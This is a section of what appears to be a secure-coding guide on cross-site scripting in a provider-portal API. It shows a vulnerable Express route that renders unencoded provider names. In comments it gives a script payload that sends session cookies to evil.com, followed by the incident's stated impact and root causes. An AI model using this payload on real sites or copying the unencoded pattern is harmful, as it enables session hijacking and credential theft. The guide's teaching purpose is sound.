#### Problem 2: Cross-Site Scripting (XSS) Attacks

APIs returning HTML or embedding user-supplied data in web pages without encoding enable XSS attacks that hijack user sessions and steal credentials.

**Real-World Example - Provider Portal (June 2024):**
```javascript
// VULNERABLE: Unencoded provider name in HTML response
app.get('/providers/:npi', async (req, res) => {
    const provider = await db.getProvider(req.params.npi);

    // Provider name not HTML encoded before rendering
    const html = `
        <h1>Provider Profile</h1>
        <div class="provider-name">${provider.name}</div>
        <div class="specialty">${provider.specialty}</div>
    `;

    res.send(html);
});

// ATTACK: Attacker registers provider with malicious name:
// POST /api/providers {
//   "npi": "9876543210",
//   "name": "<script>document.location='https://evil.com?cookie='+document.cookie</script>",
//   "specialty": "Family Medicine"
// }

// RESULTING HTML when viewing provider profile:
// <div class="provider-name">
//   <script>document.location='https://evil.com?cookie='+document.cookie</script>
// </div>
// JavaScript executes in victim's browser, stealing session cookie
```

**Impact**: 380 provider accounts hijacked, unauthorized claims access, forced password resets, $150K incident response costs.

**Root Cause**:
- No HTML encoding of user-controlled data
- Accepted JavaScript in provider name field without validation
- Missing Content-Security-Policy headers

